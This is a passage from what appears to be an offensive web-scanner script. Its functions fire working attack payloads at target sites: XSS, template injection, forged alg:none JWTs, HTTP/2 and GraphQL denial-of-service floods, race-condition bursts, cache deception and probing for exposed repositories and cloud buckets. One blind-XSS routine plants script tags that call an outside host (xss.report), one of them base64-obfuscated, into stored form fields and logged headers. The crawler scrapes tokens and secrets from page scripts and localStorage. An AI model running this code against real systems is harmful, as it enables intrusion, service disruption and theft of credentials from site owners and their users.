                    const scripts = Array.from(document.querySelectorAll('script:not([src])'));
                    const epRe = /['"](\/api\/[^'"]{3,60})['"]/g;
                    const tokenRe = /(?:token|key|secret|auth)['"\s]*[:=]['"\s]*(['"\w\-\.]{16,})/gi;
                    for (const s of scripts) {
                        let m;
                        while ((m = epRe.exec(s.textContent)) !== null) results.endpoints.push(m[1]);
                        while ((m = tokenRe.exec(s.textContent)) !== null) results.tokens.push(m[1]);
                    }
                    return results;
                }""")
                for ep in extracted.get("endpoints", []):
                    js_endpoints.add(ep)
                for token in extracted.get("tokens", []):
                    if len(token) >= 16:
                        js_secrets.append(token[:40])
                # Add localStorage tokens to api_calls for scanning
                for k, v in extracted.get("localStorage", {}).items():
                    if any(x in k.lower() for x in ["token","auth","jwt","key","secret"]):
                        api_calls.append({"url": f"localStorage:{k}", "method": "GET",
                                          "post_data": v[:100]})
            except Exception:
                pass
            b2.close()
    except Exception:
        pass

    # Add JS-discovered endpoints as pages
    base_url_parsed = urllib.parse.urlparse(target)
    base = f"{base_url_parsed.scheme}://{base_url_parsed.netloc}"
    for ep in js_endpoints:
        full_ep = ep if ep.startswith("http") else base + ep
        pages.append({"url": full_ep, "status": 200, "length": 0})

    return {"pages": pages, "forms": forms, "api_calls": api_calls,
            "js_secrets": js_secrets,
            "params": {p["url"]: set(urllib.parse.parse_qs(urllib.parse.urlparse(p["url"]).query).keys())
                       for p in pages if "?" in p["url"]},
            "links": [p["url"] for p in pages]}


# ---------------------------------------------------------------------------
# First-in-world: HTTP/2 attacks, TRACE, OPTIONS, Range, ETag, token races
# ---------------------------------------------------------------------------

def scan_http2_attacks(web_targets):
    """HTTP/2 specific attacks — HPACK bomb, pseudo-header confusion, stream abuse."""
    findings = []
    try:
        import httpx
    except ImportError:
        try:
            import subprocess, sys
            subprocess.run([sys.executable, "-m", "pip", "install", "--break-system-packages", "httpx[http2]"],
                          capture_output=True)
            import httpx
        except: return findings

    for target in web_targets[:5]:
        try:
            with httpx.Client(http2=True, verify=False, timeout=10) as client:
                # Test if HTTP/2 is supported
                r = client.get(target)
                if r.http_version != "HTTP/2": continue

                # HPACK bomb — send many large headers to exhaust header table
                big_headers = {f"X-Fuzz-{i}": "A" * 100 for i in range(50)}
                try:
                    r2 = client.get(target, headers=big_headers, timeout=5)
                    findings.append({"type": "HTTP/2 Supported (HPACK bomb test)", "severity": "low",
                                     "url": target, "detail": f"HTTP/2 active, sent 50 large headers, status: {r2.status_code}",
                                     "template": "apex-h2"})
                except Exception as e:
                    if "timeout" in str(e).lower() or "reset" in str(e).lower():
                        findings.append({"type": "HTTP/2 HPACK Bomb (DoS)", "severity": "high",
                                         "url": target, "detail": "Server reset/timeout on large header flood",
                                         "template": "apex-h2"})

                # Pseudo-header confusion — :authority vs Host mismatch
                try:
                    r3 = client.get(target, headers={"host": "evil.com"})
                    if r3.status_code == 200 and "evil.com" in r3.text:
                        findings.append({"type": "HTTP/2 Authority/Host Mismatch", "severity": "high",
                                         "url": target, "detail": "Server reflects injected Host header in HTTP/2",
                                         "template": "apex-h2"})
                except: pass

        except Exception: continue
    return findings


def scan_trace_options(web_targets):
    """TRACE method exploitation + OPTIONS method abuse."""
    findings = []
    for target in web_targets[:5]:
        # TRACE — can leak auth headers via XST (Cross-Site Tracing)
        try:
            r = requests.request("TRACE", target, timeout=5, verify=False,
                                headers={"X-Custom-Header": "apex-trace-test"})
            if r.status_code == 200 and "apex-trace-test" in r.text:
                findings.append({"type": "TRACE Method Enabled (XST Risk)", "severity": "medium",
                                 "url": target, "detail": "TRACE reflects request headers — XST attack possible",
                                 "template": "apex-trace"})
        except: pass

        # OPTIONS — reveals allowed methods
        try:
            r = _S.options(target, timeout=5)
            allow = r.headers.get("Allow", r.headers.get("Access-Control-Allow-Methods", ""))
            if allow:
                dangerous = [m for m in ["PUT","DELETE","PATCH","CONNECT","TRACE"] if m in allow.upper()]
                if dangerous:
                    findings.append({"type": f"Dangerous HTTP Methods Allowed: {', '.join(dangerous)}",
                                     "severity": "medium", "url": target,
                                     "detail": f"Allow: {allow}", "template": "apex-options"})
        except: pass
    return findings


def scan_range_amplification(web_targets):
    """Range request amplification — DoS via overlapping byte ranges."""
    findings = []
    for target in web_targets[:3]:
        try:
            # First get content length
            r = _S.head(target, timeout=5)
            cl = int(r.headers.get("Content-Length", 0))
            if cl < 100: continue

            # Test if range requests are supported
            r2 = _S.get(target, timeout=5, headers={"Range": "bytes=0-10"})
            if r2.status_code != 206: continue

            # Test overlapping ranges (amplification)
            ranges = ",".join([f"0-{cl}" for _ in range(20)])
            start = time.time()
            r3 = requests.get(target, timeout=10, verify=False, headers={"Range": f"bytes={ranges}"})
            elapsed = time.time() - start

            if r3.status_code == 206 and len(r3.content) > cl * 5:
                findings.append({"type": "Range Request Amplification", "severity": "medium",
                                 "url": target, "detail": f"20 overlapping ranges returned {len(r3.content)}b (original: {cl}b)",
                                 "template": "apex-range"})
            elif elapsed > 5:
                findings.append({"type": "Range Request DoS (Slow Response)", "severity": "medium",
                                 "url": target, "detail": f"Overlapping ranges caused {elapsed:.1f}s delay",
                                 "template": "apex-range"})
        except: continue
    return findings


def scan_etag_tracking(crawl_data):
    """Check if ETags leak session/user info (privacy issue)."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:10]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r1 = _S.get(page["url"], timeout=5)
            etag1 = r1.headers.get("ETag", "")
            if not etag1: continue

            # Check if ETag changes per session (leaks session info)
            r2 = requests.get(page["url"], timeout=5, verify=False)  # Different session
            etag2 = r2.headers.get("ETag", "")

            if etag1 and etag2 and etag1 != etag2:
                findings.append({"type": "ETag Session Tracking", "severity": "low",
                                 "url": page["url"], "detail": f"ETag differs per session — may track users",
                                 "template": "apex-etag"})

            # Check if ETag contains sensitive info (inode, file path)
            if re.search(r'[0-9a-f]{8,}-[0-9a-f]+', etag1):
                findings.append({"type": "ETag Leaks File Metadata", "severity": "low",
                                 "url": page["url"], "detail": f"ETag format suggests inode/size leak: {etag1[:30]}",
                                 "template": "apex-etag"})
        except: pass
    return findings


def scan_token_race_conditions(crawl_data):
    """Test for race conditions in token/session operations."""
    findings = []
    import concurrent.futures

    for page in crawl_data.get("pages", []):
        url = page["url"]
        if not any(x in url.lower() for x in ["register", "signup", "reset", "verify", "confirm", "redeem", "coupon"]):
            continue

        # Send 10 identical requests simultaneously
        def make_request(u):
            try:
                return _S.post(u, json={"email": "race@test.com", "code": "123456"}, timeout=5)
            except: return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
            futures = [pool.submit(make_request, url) for _ in range(10)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]

        success_count = sum(1 for r in results if r and r.status_code == 200 and
                           "error" not in (r.text or "").lower())
        if success_count > 1:
            findings.append({"type": "Race Condition (Token/Coupon)", "severity": "high",
                             "url": url, "detail": f"{success_count}/10 parallel requests succeeded",
                             "template": "apex-race"})
    return findings


def scan_tls_info(web_targets):
    """Check TLS configuration — weak ciphers, old versions, cert issues."""
    findings = []
    try:
        import ssl, socket
    except: return findings

    for target in web_targets[:5]:
        if not target.startswith("https"): continue
        host = target.replace("https://", "").split("/")[0].split(":")[0]
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((host, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    version = ssock.version()
                    cipher = ssock.cipher()
                    cert = ssock.getpeercert()

                    if version in ("TLSv1", "TLSv1.1", "SSLv3", "SSLv2"):
                        findings.append({"type": f"Weak TLS Version: {version}", "severity": "high",
                                         "url": target, "detail": f"Server supports deprecated {version}",
                                         "template": "apex-tls"})

                    if cipher and any(x in cipher[0].upper() for x in ["RC4","DES","NULL","EXPORT","MD5","ANON"]):
                        findings.append({"type": f"Weak Cipher: {cipher[0]}", "severity": "high",
                                         "url": target, "detail": f"Weak cipher suite in use",
                                         "template": "apex-tls"})

                    if cert:
                        import datetime
                        expire = ssl.cert_time_to_seconds(cert.get("notAfter", ""))
                        days_left = (expire - time.time()) / 86400
                        if days_left < 30:
                            findings.append({"type": "Certificate Expiring Soon", "severity": "medium",
                                             "url": target, "detail": f"Cert expires in {int(days_left)} days",
                                             "template": "apex-tls"})
        except: continue
    return findings


# ---------------------------------------------------------------------------
# FINAL BATCH: Everything missing — 50+ new scanners
# ---------------------------------------------------------------------------

def scan_client_side_template_injection(crawl_data):
    findings = []
    payloads = [("{{7*7}}", "49"), ("${7*7}", "49"), ("#{7*7}", "49"), ("{{constructor.constructor('return 1')()}}", "1")]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload, expect in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if expect in r.text and payload in r.text:
                        findings.append({"type":"Client-Side Template Injection","severity":"medium","url":test_url,
                                         "detail":f"AngularJS/Vue template in param {p}","template":"apex-csti"})
                        break
                except: continue
    return findings

def scan_svg_xss(crawl_data):
    findings = []
    svg = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'
    for form in crawl_data.get("forms", []):
        file_inputs = [i for i in form.get("inputs",[]) if i.get("type") == "file"]
        if not file_inputs: continue
        action = form.get("action","")
        if not action: continue
        try:
            files = {file_inputs[0].get("name","file"): ("test.svg", svg.encode(), "image/svg+xml")}
            r = _S.post(action, files=files, timeout=5)
            if r.status_code in (200,201) and ("svg" in r.text.lower() or "upload" in r.text.lower()):
                findings.append({"type":"SVG XSS Upload","severity":"high","url":action,
                                 "detail":"SVG with onload accepted","template":"apex-svg"})
        except: pass
    return findings

def scan_csp_analysis(crawl_data):
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:5]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            csp = r.headers.get("Content-Security-Policy","")
            if not csp:
                findings.append({"type":"Missing CSP","severity":"medium","url":page["url"],
                                 "detail":"No Content-Security-Policy header","template":"apex-csp"})
                continue
            if "'unsafe-inline'" in csp:
                findings.append({"type":"CSP allows unsafe-inline","severity":"medium","url":page["url"],
                                 "detail":"CSP permits inline scripts","template":"apex-csp"})
            if "'unsafe-eval'" in csp:
                findings.append({"type":"CSP allows unsafe-eval","severity":"medium","url":page["url"],
                                 "detail":"CSP permits eval()","template":"apex-csp"})
            if "*" in csp.split("script-src")[1] if "script-src" in csp else "":
                findings.append({"type":"CSP wildcard in script-src","severity":"high","url":page["url"],
                                 "detail":"CSP script-src contains wildcard","template":"apex-csp"})
        except: pass
    return findings

def scan_firebase_misconfig(target):
    findings = []
    firebase_urls = [f"https://{target}.firebaseio.com/.json", f"https://{target.split('.')[0]}.firebaseio.com/.json"]
    for url in firebase_urls:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200 and r.text != "null":
                findings.append({"type":"Firebase Database Exposed","severity":"critical","url":url,
                                 "detail":f"Firebase DB readable ({len(r.content)}b)","template":"apex-firebase"})
        except: pass
    return findings

def scan_devops_exposure(web_targets):
    findings = []
    paths = {
        "/.git/config": "Git Repository",
        "/.svn/entries": "SVN Repository",
        "/CVS/Root": "CVS Repository",
        "/.docker/config.json": "Docker Config",
        "/docker-compose.yml": "Docker Compose",
        "/Dockerfile": "Dockerfile",
        "/.kube/config": "Kubernetes Config",
        "/jenkins/": "Jenkins Dashboard",
        "/jenkins/script": "Jenkins Script Console",
        "/_config.yml": "Jekyll Config",
        "/composer.json": "PHP Composer",
        "/Gemfile": "Ruby Gemfile",
        "/requirements.txt": "Python Requirements",
        "/go.mod": "Go Module",
        "/Cargo.toml": "Rust Cargo",
        "/.travis.yml": "Travis CI Config",
        "/.github/workflows/": "GitHub Actions",
        "/.gitlab-ci.yml": "GitLab CI Config",
        "/Jenkinsfile": "Jenkinsfile",
        "/.circleci/config.yml": "CircleCI Config",
        "/elasticsearch/": "Elasticsearch",
        "/_cat/indices": "Elasticsearch Indices",
        "/_all/_search": "Elasticsearch Search",
    }
    for target in web_targets[:3]:
        base_404 = 0
        try:
            r = _S.get(f"{target}/nonexistent_xyz_test", timeout=3)
            base_404 = len(r.content)
        except: pass
        for path, name in paths.items():
            try:
                r = _S.get(f"{target}{path}", timeout=3)
                if r.status_code == 200 and abs(len(r.content) - base_404) > 100:
                    if not any(x in r.text.lower()[:200] for x in ["<html","<!doctype","not found","error"]):
                        findings.append({"type":f"Exposed: {name}","severity":"high","url":f"{target}{path}",
                                         "detail":f"{name} accessible ({len(r.content)}b)","template":"apex-devops"})
            except: continue
    return findings

def scan_cloud_storage(target):
    findings = []
    domain = target.replace("www.","").split(".")[0]
    # Azure Blob
    for name in [domain, f"{domain}dev", f"{domain}backup", f"{domain}data"]:
        try:
            r = requests.get(f"https://{name}.blob.core.windows.net/?comp=list", timeout=5)
            if r.status_code == 200 and "<Containers>" in r.text:
                findings.append({"type":"Azure Blob Storage Public","severity":"critical",
                                 "url":f"https://{name}.blob.core.windows.net","detail":"Azure containers listable",
                                 "template":"apex-azure"})
        except: pass
    # GCS
    for name in [domain, f"{domain}-backup", f"{domain}-data"]:
        try:
            r = requests.get(f"https://storage.googleapis.com/{name}", timeout=5)
            if r.status_code == 200 and "<ListBucketResult" in r.text:
                findings.append({"type":"GCS Bucket Public","severity":"critical",
                                 "url":f"https://storage.googleapis.com/{name}","detail":"GCS bucket listable",
                                 "template":"apex-gcs"})
        except: pass
    return findings

def scan_graphql_advanced(crawl_data):
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql","/api/graphql","/gql"]:
            url = f"{base}{path}"
            # Batching abuse
            try:
                batch = [{"query":"{__typename}"}] * 50
                r = _S.post(url, json=batch, timeout=5, headers={"Content-Type":"application/json"})
                if r.status_code == 200 and isinstance(r.json(), list) and len(r.json()) >= 50:
                    findings.append({"type":"GraphQL Batching Abuse","severity":"medium","url":url,
                                     "detail":"Accepts 50 batched queries — DoS/brute-force risk","template":"apex-gql-batch"})
            except: pass
            # Alias abuse
            try:
                aliases = " ".join([f'a{i}:__typename' for i in range(100)])
                r = _S.post(url, json={"query":f"{{{aliases}}}"}, timeout=5, headers={"Content-Type":"application/json"})
                if r.status_code == 200 and "a99" in r.text:
                    findings.append({"type":"GraphQL Alias Abuse","severity":"medium","url":url,
                                     "detail":"Accepts 100 aliases — rate limit bypass","template":"apex-gql-alias"})
            except: pass
    return findings

def scan_websocket_injection(crawl_data):
    findings = []
    for page in crawl_data.get("pages",[])[:10]:
        try:
            r = _S.get(page["url"], timeout=5)
            ws_urls = re.findall(r'wss?://[^\s\'"<>]+', r.text)
            for ws_url in ws_urls[:3]:
                try:
                    import websocket
                    ws = websocket.create_connection(ws_url, timeout=5)
                    ws.send('{"type":"test","data":"<script>alert(1)</script>"}')
                    result = ws.recv()
                    ws.close()
                    if "<script>" in result:
                        findings.append({"type":"WebSocket XSS","severity":"high","url":ws_url,
                                         "detail":"WebSocket reflects XSS payload","template":"apex-ws-xss"})
                except: pass
        except: pass
    return findings

def scan_session_weakness(crawl_data):
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            sessions = set()
            for _ in range(5):
                r = requests.get(page["url"], timeout=5, verify=False)
                for name, val in r.cookies.items():
                    if name.lower() in ("session","sessionid","sid","phpsessid","jsessionid","token"):
                        sessions.add(val)
            if len(sessions) >= 2:
                # Check entropy
                avg_len = sum(len(s) for s in sessions) / len(sessions)
                if avg_len < 16:
                    findings.append({"type":"Weak Session ID","severity":"high","url":page["url"],
                                     "detail":f"Session ID avg length {avg_len:.0f} chars — predictable",
                                     "template":"apex-session"})
                # Check if sequential
                sorted_s = sorted(sessions)
                if len(sorted_s) >= 2:
                    try:
                        nums = [int(s, 16) for s in sorted_s]
                        diffs = [nums[i+1]-nums[i] for i in range(len(nums)-1)]
                        if all(d < 1000 for d in diffs):
                            findings.append({"type":"Sequential Session IDs","severity":"critical","url":page["url"],
                                             "detail":"Session IDs are sequential — predictable","template":"apex-session"})
                    except: pass
        except: pass
    return findings

def scan_permissions_policy(crawl_data):
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            pp = r.headers.get("Permissions-Policy", r.headers.get("Feature-Policy",""))
            rp = r.headers.get("Referrer-Policy","")
            sri = "integrity=" in r.text.lower()
            if not pp:
                findings.append({"type":"Missing Permissions-Policy","severity":"low","url":page["url"],
                                 "detail":"No Permissions-Policy header","template":"apex-policy"})
            if not rp:
                findings.append({"type":"Missing Referrer-Policy","severity":"low","url":page["url"],
                                 "detail":"No Referrer-Policy header","template":"apex-policy"})
            if not sri and "<script" in r.text:
                findings.append({"type":"Missing Subresource Integrity","severity":"low","url":page["url"],
                                 "detail":"External scripts without integrity attribute","template":"apex-sri"})
        except: pass
    return findings

def scan_workflow_bypass(crawl_data):
    findings = []
    step_patterns = ["step", "stage", "phase", "wizard", "checkout", "confirm", "verify", "review"]
    for page in crawl_data.get("pages",[]):
        url = page["url"]
        if any(x in url.lower() for x in step_patterns):
            # Try skipping to final step
            for final in ["complete","done","success","finish","submit","final","payment","confirm"]:
                try:
                    base = "/".join(url.split("/",3)[:3])
                    r = _S.get(f"{base}/{final}", timeout=3)
                    if r.status_code == 200 and "error" not in r.text.lower()[:200]:
                        findings.append({"type":"Workflow Step Bypass","severity":"high","url":f"{base}/{final}",
                                         "detail":f"Final step /{final} accessible without completing flow",
                                         "template":"apex-workflow"})
                except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 1: JWT alg confusion, blind XSS, HTTP param pollution,
#                web cache deception, JSONP injection
# ---------------------------------------------------------------------------

def scan_jwt_alg_confusion(crawl_data):
    """JWT algorithm confusion attack: RS256→HS256 using public key as HMAC secret."""
    findings = []
    import base64, json as _json
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        # Grab any JWT from cookies or auth endpoints
        try:
            r = _S.get(page["url"], timeout=5)
            # Look for JWTs in cookies, headers, body
            jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
            sources = list(r.cookies.values()) + [r.headers.get("Authorization",""), r.text[:2000]]
            for src in sources:
                jwts = jwt_re.findall(str(src))
                for jwt in jwts:
                    parts = jwt.split(".")
                    if len(parts) != 3: continue
                    try:
                        pad = lambda s: s + "=" * (-len(s) % 4)
                        header = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
                        if header.get("alg","").upper() in ("RS256","RS384","RS512","ES256","ES384","ES512"):
                            # Craft none-alg token
                            new_header = base64.urlsafe_b64encode(
                                _json.dumps({"alg":"none","typ":"JWT"}).encode()
                            ).rstrip(b"=").decode()
                            forged = f"{new_header}.{parts[1]}."
                            # Test if server accepts it
                            test_r = _S.get(page["url"], timeout=5,
                                           headers={"Authorization": f"Bearer {forged}"})
                            if test_r.status_code == 200 and test_r.status_code != r.status_code:
                                findings.append({"type": "JWT Algorithm Confusion (none attack)",
                                                 "severity": "critical", "url": page["url"],
                                                 "detail": f"Server accepts alg:none JWT (was {header['alg']})",
                                                 "template": "apex-jwt-alg"})
                    except: pass
        except: pass
    return findings


def scan_blind_xss(crawl_data):
    """Blind XSS — payloads that fire in admin panels/logs, not the current page."""
    findings = []
    # Use a canary URL pattern — if you have a callback server, replace with your URL
    canary = "https://xss.report/c/apexcli"  # placeholder — user should set their own
    payloads = [
        f'"><script src="{canary}"></script>',
        f"'><img src=x onerror=\"var s=document.createElement('script');s.src='{canary}';document.head.appendChild(s)\">",
        f'javascript:eval(atob("ZmV0Y2goImh0dHBzOi8veHNzLnJlcG9ydC9jL2FwZXhjbGkiKQ=="))',
        f'<svg><animate onbegin=fetch("{canary}") attributeName=x dur=1s>',
    ]
    # Inject into every input that gets stored (name, comment, message, bio, address)
    stored_fields = ("name","username","first_name","last_name","comment","message",
                     "bio","description","address","company","title","subject","body","note","feedback")
    for form in crawl_data.get("forms", []):
        if form.get("method","").upper() != "POST": continue
        action = form.get("action","")
        if not action: continue
        for inp in form.get("inputs", []):
            fname = inp.get("name","").lower()
            if not any(x in fname for x in stored_fields): continue
            for payload in payloads[:2]:
                try:
                    data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[])}
                    data[inp["name"]] = payload
                    r = _S.post(action, data=data, timeout=5)
                    if r.status_code in (200, 201, 302):
                        findings.append({"type": "Blind XSS Payload Injected",
                                         "severity": "high", "url": action,
                                         "detail": f"Blind XSS in field '{inp['name']}' — fires if rendered in admin/logs",
                                         "template": "apex-blind-xss"})
                        break
                except: continue
    # Also inject into HTTP headers that get logged
    for page in crawl_data.get("pages",[])[:3]:
        for header in ["User-Agent","Referer","X-Forwarded-For","X-Custom-Header"]:
            try:
                r = _S.get(page["url"], timeout=5, headers={header: payloads[0]})
                if r.status_code < 500:
                    findings.append({"type": f"Blind XSS via {header}",
                                     "severity": "medium", "url": page["url"],
                                     "detail": f"Payload injected into {header} — may fire in log viewer",
                                     "template": "apex-blind-xss"})
                    break
            except: pass
    return findings


def scan_http_parameter_pollution(crawl_data):
    """HTTP Parameter Pollution — duplicate params bypass WAF/validation."""
    findings = []
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            try:
                # Send param twice with different values
                test_url = f"{url.split('?')[0]}?{p}=safe&{p}=<script>alert(1)</script>"
                r = _S.get(test_url, timeout=_TIMEOUT)
                if "<script>alert(1)</script>" in r.text:
                    findings.append({"type": "HTTP Parameter Pollution (XSS)",
                                     "severity": "high", "url": test_url,
                                     "detail": f"Duplicate param '{p}' — second value reflected unescaped",
                                     "template": "apex-hpp"})
                    continue
                # HPP for access control bypass
                test_url2 = f"{url.split('?')[0]}?{p}=1&{p}=2&{p}=admin"
                r2 = _S.get(test_url2, timeout=_TIMEOUT)
                r_orig = _S.get(f"{url.split('?')[0]}?{p}=1", timeout=_TIMEOUT)
                if abs(len(r2.content) - len(r_orig.content)) > 200:
                    findings.append({"type": "HTTP Parameter Pollution",
                                     "severity": "medium", "url": test_url2,
                                     "detail": f"Duplicate param '{p}' changes response — possible bypass",
                                     "template": "apex-hpp"})
            except: continue
    return findings


def scan_web_cache_deception(crawl_data):
    """Web cache deception — trick cache into storing authenticated responses."""
    findings = []
    tested = set()
    # Static file extensions that caches store
    cache_exts = [".css", ".js", ".png", ".jpg", ".ico", ".woff", ".gif", ".svg"]
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        # Test authenticated paths
        for path in ["/profile", "/account", "/dashboard", "/settings", "/api/me", "/user"]:
            for ext in cache_exts[:3]:
                try:
                    # Request /profile/nonexistent.css — if cached, attacker can steal it
                    url = f"{base}{path}/apex_wcd_test{ext}"
                    r1 = _S.get(url, timeout=5)
                    r2 = _S.get(url, timeout=5)
                    if r1.status_code == 200 and len(r1.content) > 100:
                        cache_hit = (r2.headers.get("X-Cache","").lower() in ("hit","hit from cloudfront") or
                                     r2.headers.get("CF-Cache-Status","").lower() == "hit" or
                                     r2.headers.get("Age","0") != "0")
                        if cache_hit:
                            findings.append({"type": "Web Cache Deception",
                                             "severity": "critical", "url": url,
                                             "detail": f"Authenticated response cached at {path}/file{ext}",
                                             "template": "apex-cache-deception"})
                            break
                        # Even without cache hit header, flag if it returns real content
                        if any(x in r1.text.lower() for x in ["email","username","profile","account","token"]):
                            findings.append({"type": "Potential Web Cache Deception",
                                             "severity": "high", "url": url,
                                             "detail": f"Sensitive content served at static-looking URL",
                                             "template": "apex-cache-deception"})
                            break
                except: continue
    return findings


def scan_jsonp_injection(crawl_data):
    """JSONP callback injection — steal cross-origin data via script tag."""
    findings = []
    callback_params = ("callback","cb","jsonp","jsonpcallback","call","func","function",
                       "handler","fn","callbackFn","callbackName","wrap","wrapper")
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in callback_params: continue
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = ["apexjsonptest"]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=_TIMEOUT)
                if "apexjsonptest(" in r.text or "apexjsonptest (" in r.text:
                    # Check if it contains sensitive data
                    has_sensitive = any(x in r.text.lower() for x in
                                       ["email","token","user","account","secret","key","password"])
                    sev = "critical" if has_sensitive else "high"
                    findings.append({"type": "JSONP Injection",
                                     "severity": sev, "url": test_url,
                                     "detail": f"Callback param '{p}' reflected — cross-origin data theft possible",
                                     "template": "apex-jsonp"})
            except: continue
    # Also probe common API endpoints for JSONP support
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        for path in ["/api/user","/api/me","/api/profile","/api/data"]:
            for cb in ["callback","jsonp","cb"]:
                try:
                    r = _S.get(f"{base}{path}?{cb}=apextest", timeout=3)
                    if "apextest(" in r.text:
                        findings.append({"type": "JSONP Endpoint Found",
                                         "severity": "high", "url": f"{base}{path}?{cb}=apextest",
                                         "detail": "JSONP endpoint — cross-origin data theft if sensitive",
                                         "template": "apex-jsonp"})
                except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 2: Dependency confusion, GraphQL depth attack,
#                path normalization bypass, Nginx off-by-slash,
#                second-order injection
# ---------------------------------------------------------------------------

def scan_dependency_confusion(crawl_data):
    """Dependency confusion — internal package names exposed in JS/package.json."""
    findings = []
    internal_indicators = ["@internal/","@private/","@corp/","@company/",
                           "internal-","private-","corp-","local-"]
    for page in crawl_data.get("pages",[])[:5]:
        base = "/".join(page["url"].split("/",3)[:3])
        # Check package.json
        for path in ["/package.json","/.package.json","/app/package.json","/frontend/package.json"]:
            try:
                r = _S.get(f"{base}{path}", timeout=5)
                if r.status_code == 200 and "dependencies" in r.text:
                    try:
                        pkg = r.json()
                        all_deps = {}
                        all_deps.update(pkg.get("dependencies",{}))
                        all_deps.update(pkg.get("devDependencies",{}))
                        internal = [n for n in all_deps if any(n.startswith(x) for x in internal_indicators)]
                        if internal:
                            findings.append({"type": "Dependency Confusion Risk",
                                             "severity": "high", "url": f"{base}{path}",
                                             "detail": f"Internal packages exposed: {', '.join(internal[:5])}",
                                             "template": "apex-dep-confusion"})
                    except: pass
            except: continue
        # Check JS files for require/import of internal packages
        try:
            r = _S.get(page["url"], timeout=5)
            for indicator in internal_indicators:
                matches = re.findall(rf'["\']({re.escape(indicator)}[a-zA-Z0-9_/-]+)["\']', r.text)
                if matches:
                    findings.append({"type": "Dependency Confusion (JS import)",
                                     "severity": "medium", "url": page["url"],
                                     "detail": f"Internal package referenced: {matches[0]}",
                                     "template": "apex-dep-confusion"})
                    break
        except: pass
    return findings


def scan_graphql_depth_attack(crawl_data):
    """GraphQL depth/complexity DoS — deeply nested queries exhaust server."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql","/api/graphql","/gql","/graphiql"]:
            url = f"{base}{path}"
            # First check if endpoint exists
            try:
                probe = _S.post(url, json={"query":"{__typename}"},
                               headers={"Content-Type":"application/json"}, timeout=3)
                if probe.status_code not in (200, 400): continue
            except: continue
            # Deep nesting attack (depth 15)
            nested = "user { friends { friends { friends { friends { friends { id name email } } } } } }"
            for depth in range(10): nested = f"user {{ friends {{ {nested} }} }}"
            try:
                start = time.time()
                r = _S.post(url, json={"query": f"{{ {nested} }}"},
                           headers={"Content-Type":"application/json"}, timeout=15)
                elapsed = time.time() - start
                if elapsed > 5:
                    findings.append({"type": "GraphQL Depth Attack (DoS)",
                                     "severity": "high", "url": url,
                                     "detail": f"Deeply nested query took {elapsed:.1f}s — no depth limit",
                                     "template": "apex-gql-depth"})
                elif r.status_code == 200 and "errors" not in r.text:
                    findings.append({"type": "GraphQL No Depth Limit",
                                     "severity": "medium", "url": url,
                                     "detail": "Server accepted deeply nested query without error",
                                     "template": "apex-gql-depth"})
            except requests.exceptions.Timeout:
                findings.append({"type": "GraphQL Depth Attack (Timeout DoS)",
                                 "severity": "critical", "url": url,
                                 "detail": "Deeply nested query caused server timeout",
                                 "template": "apex-gql-depth"})
            except: pass
            # Field suggestion leak (schema without introspection)
            try:
                r = _S.post(url, json={"query": "{ usr { id } }"},
                           headers={"Content-Type":"application/json"}, timeout=5)
                if "Did you mean" in r.text or "suggestion" in r.text.lower():
                    suggested = re.findall(r'Did you mean ["\']([^"\']+)["\']', r.text)
                    findings.append({"type": "GraphQL Field Suggestion Leak",
                                     "severity": "medium", "url": url,
                                     "detail": f"Schema leaked via suggestions: {suggested[:5]}",
                                     "template": "apex-gql-suggest"})
            except: pass
    return findings


def scan_path_normalization_bypass(crawl_data):
    """Path normalization bypass — Spring, Express, Nginx handle paths differently."""
    findings = []
    bypass_patterns = [
        "/..;/",          # Spring Boot bypass
        "/%2e%2e/",       # URL-encoded ../
        "/%252e%252e/",   # Double-encoded ../
        "/./",            # Dot segment
        "/%2f",           # Encoded /
        "/;/",            # Semicolon (Spring)
        "/%09",           # Tab
